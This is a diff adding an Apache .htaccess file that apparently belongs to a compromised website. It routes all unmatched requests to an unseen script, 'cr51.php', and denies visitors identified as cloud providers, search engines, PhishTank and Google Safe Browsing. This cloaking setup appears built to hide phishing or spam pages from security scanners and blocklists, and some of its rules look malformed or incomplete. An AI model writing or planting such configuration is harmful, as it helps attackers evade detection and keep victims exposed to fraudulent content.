@@ -1,0 +1,35 @@
+RewriteEngine On
+Options -Indexes
+Options +FollowSymlinks
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ cr51.php?z=$1 [L]
+DirectoryIndex cr51.php index.htm index.html index.php
+
+RewriteBase /  
+SetEnvIfNoCase User-Agent "^DigitalOcean, LLC" bad_user
+SetEnvIfNoCase User-Agent "^Amazon Technologies Inc." bad_user
+SetEnvIfNoCase User-Agent "^Amazon.com, Inc." bad_user
+SetEnvIfNoCase User-Agent "^Google LLC" bad_user
+SetEnvIfNoCase User-Agent "^FranTech Solutions" bad_user
+SetEnvIfNoCase User-Agent "^Tier.Net Technologies LLC" bad_user
+SetEnvIfNoCase User-Agent "^OVH SAS" bad_user
+Deny from env=bad_user
+
+RewriteCond %{HTTP_REFERER} google\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} amazon\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} digitalocean\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} facebook\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} yahoo\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} bing\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} msn\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} aol\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} hotbot\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} phishtank\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} infoseek\.co\.jp [NC,OR]
+RewriteCond %{HTTP_REFERER} ^http(s)?://(www\.)?http://safebrowsing-cache.google.com/.*$ [NC]
+
+<FilesMatch "\.(ini|htaccess|inc|info|install|make|module|profile|test|po|sh|.*sql|theme|tpl(\.php)?|xtmpl)(~|\.sw[op]|\.bak|\.orig|\.save)?$|^(\.(?!well-known).*|Entries.*|Repository|Root|Tag|Template|composer\.(json|lock)|package\.(json|lock)|web\.config)$|^#.*#$|\.php(~|\.sw[op]|\.bak|\.orig\.save)$">
+Order allow,deny
+Deny from all
+</FilesMatch> 
